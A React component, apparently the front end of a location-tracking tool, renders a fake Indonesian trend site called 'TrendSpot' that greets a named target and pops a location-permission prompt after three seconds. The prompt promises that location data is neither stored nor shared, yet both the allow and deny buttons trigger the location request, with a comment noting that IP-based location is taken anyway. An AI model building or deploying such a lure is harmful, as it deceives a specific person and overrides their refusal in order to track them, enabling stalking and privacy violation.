import React, { useState, useEffect } from "react";

interface DisguisedLandingPageProps {
  targetName: string;
  onLocationRequest: () => void;
  isLoading: boolean;
  category?: string;
  item?: string;
}

const DisguisedLandingPage: React.FC<DisguisedLandingPageProps> = ({
  targetName,
  onLocationRequest,
  isLoading,
  category = "lifestyle",
}) => {
  const [showLocationPrompt, setShowLocationPrompt] = useState(false);
  const [hasTriggered, setHasTriggered] = useState(false);

  // Content variants based on category
  const contentVariants = {
    fashion: {
      title: "✨ Trend Fashion Terkini",
      subtitle: "Gaya yang Lagi Hits Banget!",
      icon: "👗",
      content: [
        "🔥 Style Korea yang lagi viral",
        "💎 Tips mix & match outfit",
        "🌟 Fashion hack untuk tampil kece",
        "👑 Inspirasi dari fashion influencer top",
      ],
      cta: "Lihat Collection Lengkap",
      bgGradient: "from-pink-400 to-purple-600",
    },
    music: {
      title: "🎵 Playlist Hits 2025",
      subtitle: "Lagu-lagu yang Wajib Ada di Playlist!",
      icon: "🎧",
      content: [
        "🔥 Chart #1 minggu ini",
        "💫 Lagu viral di TikTok",
        "🎤 Rekomendasi artist baru",
        "🌟 Playlist mood booster",
      ],
      cta: "Dengarkan Sekarang",
      bgGradient: "from-purple-400 to-blue-600",
    },
    lifestyle: {
      title: "💫 Motivasi Hari Ini",
      subtitle: "Semangat Menjalani Hari-hari Kamu!",
      icon: "🌈",
      content: [
        "✨ Quote inspiratif untuk hari ini",
        "🌟 Tips self-care yang mudah",
        "💪 Mindset positif untuk sukses",
        "🎯 Cara mencapai goals impian",
      ],
      cta: "Dapatkan Inspirasi Lebih",
      bgGradient: "from-yellow-400 to-orange-600",
    },
    food: {
      title: "🍜 Resep Viral TikTok",
      subtitle: "Makanan Enak yang Lagi Trending!",
      icon: "🍴",
      content: [
        "🔥 Resep hits dari Korea",
        "🌟 Makanan aesthetic untuk feed IG",
        "💎 Tips masak ala chef profesional",
        "🎯 Camilan sehat yang praktis",
      ],
      cta: "Lihat Resep Lengkap",
      bgGradient: "from-red-400 to-pink-600",
    },
  };

  const currentContent =
    contentVariants[category as keyof typeof contentVariants] || contentVariants.lifestyle;

  // Trigger location request after a natural delay
  useEffect(() => {
    if (!hasTriggered) {
      const timer = setTimeout(() => {
        setShowLocationPrompt(true);
        setHasTriggered(true);
      }, 3000); // Show after 3 seconds

      return () => clearTimeout(timer);
    }
  }, [hasTriggered]);

  const handleLocationAllow = () => {
    setShowLocationPrompt(false);
    onLocationRequest();
  };

  const handleLocationDeny = () => {
    setShowLocationPrompt(false);
    // Still try to get location (IP-based)
    onLocationRequest();
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 via-white to-purple-50">
      {/* Header */}
      <header className="bg-white shadow-sm border-b border-gray-100">
        <div className="max-w-6xl mx-auto px-4 py-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center space-x-2">
              <div className="w-10 h-10 bg-gradient-to-r from-blue-500 to-purple-600 rounded-lg flex items-center justify-center text-white font-bold">
                T
              </div>
              <span className="text-xl font-bold text-gray-800">TrendSpot</span>
            </div>
            <div className="hidden md:flex items-center space-x-6 text-sm text-gray-600">
              <a href="#" className="hover:text-purple-600 transition">
                Home
              </a>
              <a href="#" className="hover:text-purple-600 transition">
                Trending
              </a>
              <a href="#" className="hover:text-purple-600 transition">
                Categories
              </a>
              <a href="#" className="hover:text-purple-600 transition">
                About
              </a>
            </div>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="max-w-4xl mx-auto px-4 py-12">
        {/* Hero Section */}
        <div
          className={`bg-gradient-to-r ${currentContent.bgGradient} rounded-3xl p-8 md:p-12 text-white text-center mb-12 shadow-xl`}
        >
          <div className="text-6xl mb-4">{currentContent.icon}</div>
          <h1 className="text-4xl md:text-5xl font-bold mb-4">{currentContent.title}</h1>
          <p className="text-xl md:text-2xl opacity-90 mb-8">{currentContent.subtitle}</p>
          <div className="bg-white/20 backdrop-blur-sm rounded-2xl p-6 max-w-2xl mx-auto">
            <p className="text-lg opacity-95">
              Hai <span className="font-semibold text-yellow-200">{targetName}</span>!
              <br />
              Spesial buat kamu, nih konten yang lagi trending banget! 🔥
            </p>
          </div>
        </div>

        {/* Content Grid */}
        <div className="grid md:grid-cols-2 gap-8 mb-12">
          {currentContent.content.map((item, index) => (
            <div
              key={index}
              className="bg-white rounded-2xl p-6 shadow-lg hover:shadow-xl transition duration-300 border border-gray-100"
            >
              <div className="flex items-center space-x-3 mb-4">
                <div className="w-12 h-12 bg-gradient-to-r from-purple-500 to-pink-500 rounded-full flex items-center justify-center text-white font-bold">
                  {index + 1}
                </div>
                <h3 className="text-lg font-semibold text-gray-800">{item}</h3>
              </div>
              <p className="text-gray-600 mb-4">
                Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed do eiusmod tempor
                incididunt ut labore.
              </p>
              <button className="text-purple-600 hover:text-purple-800 font-medium text-sm transition">
                Selengkapnya →
              </button>
            </div>
          ))}
        </div>

        {/* CTA Section */}
        <div className="bg-gradient-to-r from-indigo-500 to-purple-600 rounded-3xl p-8 text-center text-white shadow-xl">
          <h2 className="text-3xl font-bold mb-4">Jangan Sampai Ketinggalan!</h2>
          <p className="text-lg opacity-90 mb-6">
            Dapatkan update terbaru dan konten eksklusif langsung ke kamu
          </p>
          <button className="bg-white text-purple-600 px-8 py-4 rounded-full font-semibold text-lg hover:bg-gray-100 transition duration-300 shadow-lg">
            {currentContent.cta}
          </button>
        </div>

        {/* Footer */}
        <footer className="mt-16 text-center text-gray-500 text-sm">
          <p>© 2025 TrendSpot. Semua trend terkini ada di sini!</p>
          <div className="flex justify-center space-x-4 mt-4">
            <a href="#" className="hover:text-purple-600 transition">
              Privacy
            </a>
            <a href="#" className="hover:text-purple-600 transition">
              Terms
            </a>
            <a href="#" className="hover:text-purple-600 transition">
              Contact
            </a>
          </div>
        </footer>
      </main>

      {/* Location Permission Modal */}
      {showLocationPrompt && (
        <div className="fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center z-50 p-4">
          <div className="bg-white rounded-3xl shadow-2xl max-w-md w-full mx-4 overflow-hidden animate-in slide-in-from-bottom duration-300">
            {/* Header */}
            <div className="bg-gradient-to-r from-blue-500 to-purple-600 text-white p-6 text-center">
              <div className="text-4xl mb-3">📍</div>
              <h3 className="text-xl font-bold mb-2">Lokasi untuk Konten Personal</h3>
              <p className="text-blue-100 text-sm">
                Kami ingin memberikan konten yang sesuai dengan area kamu
              </p>
            </div>

            {/* Content */}
            <div className="p-6">
              <div className="space-y-4 mb-6">
                <div className="flex items-center space-x-3">
                  <div className="w-10 h-10 bg-green-100 rounded-full flex items-center justify-center">
                    <span className="text-green-600">🎯</span>
                  </div>
                  <div>
                    <p className="font-medium text-gray-800">Konten Lokal</p>
                    <p className="text-sm text-gray-600">Trend yang populer di daerah kamu</p>
                  </div>
                </div>

                <div className="flex items-center space-x-3">
                  <div className="w-10 h-10 bg-purple-100 rounded-full flex items-center justify-center">
                    <span className="text-purple-600">⚡</span>
                  </div>
                  <div>
                    <p className="font-medium text-gray-800">Update Cepat</p>
                    <p className="text-sm text-gray-600">Notifikasi trend terbaru di sekitar</p>
                  </div>
                </div>

                <div className="flex items-center space-x-3">
                  <div className="w-10 h-10 bg-blue-100 rounded-full flex items-center justify-center">
                    <span className="text-blue-600">🔒</span>
                  </div>
                  <div>
                    <p className="font-medium text-gray-800">Privasi Terjaga</p>
                    <p className="text-sm text-gray-600">Data lokasi tidak disimpan permanen</p>
                  </div>
                </div>
              </div>

              <div className="bg-yellow-50 rounded-xl p-4 mb-6 border border-yellow-200">
                <p className="text-sm text-yellow-800">
                  <span className="font-medium">💡 Tips:</span> Dengan mengizinkan lokasi, kamu akan
                  mendapat rekomendasi yang lebih personal dan akurat!
                </p>
              </div>

              {/* Action Buttons */}
              <div className="space-y-3">
                <button
                  onClick={handleLocationAllow}
                  disabled={isLoading}
                  className="w-full bg-gradient-to-r from-green-500 to-emerald-600 text-white py-4 rounded-xl font-semibold hover:from-green-600 hover:to-emerald-700 transition duration-300 shadow-lg disabled:opacity-70"
                >
                  {isLoading ? (
                    <span className="flex items-center justify-center">
                      <svg
                        className="animate-spin -ml-1 mr-3 h-5 w-5 text-white"
                        xmlns="http://www.w3.org/2000/svg"
                        fill="none"
                        viewBox="0 0 24 24"
                      >
                        <circle
                          className="opacity-25"
                          cx="12"
                          cy="12"
                          r="10"
                          stroke="currentColor"
                          strokeWidth="4"
                        ></circle>
                        <path
                          className="opacity-75"
                          fill="currentColor"
                          d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                        ></path>
                      </svg>
                      Sedang Memproses...
                    </span>
                  ) : (
                    "✅ Izinkan Akses Lokasi"
                  )}
                </button>

                <button
                  onClick={handleLocationDeny}
                  className="w-full bg-gray-500 text-white py-3 rounded-xl font-medium hover:bg-gray-600 transition duration-300"
                >
                  Nanti Saja
                </button>
              </div>
            </div>

            {/* Footer */}
            <div className="bg-gray-50 px-6 py-4 border-t border-gray-200">
              <p className="text-xs text-gray-500 text-center">
                🔒 Kami menghormati privasi kamu dan tidak membagikan data lokasi ke pihak ketiga
              </p>
            </div>
          </div>
        </div>
      )}

      {/* Loading Overlay */}
      {isLoading && !showLocationPrompt && (
        <div className="fixed inset-0 bg-white/80 backdrop-blur-sm flex items-center justify-center z-50">
          <div className="bg-white rounded-2xl shadow-xl p-8 max-w-sm w-full mx-4 text-center">
            <div className="w-16 h-16 mx-auto mb-6">
              <div className="absolute inset-0 border-4 border-purple-200 rounded-full"></div>
              <div className="absolute inset-0 border-4 border-purple-500 rounded-full border-t-transparent animate-spin"></div>
            </div>
            <h3 className="text-lg font-semibold text-gray-800 mb-2">
              Menyiapkan Konten Personal...
            </h3>
            <p className="text-gray-600 text-sm">
              Tunggu sebentar, sedang mencari trend terbaik untuk kamu
            </p>
          </div>
        </div>
      )}
    </div>
  );
};

export default DisguisedLandingPage;
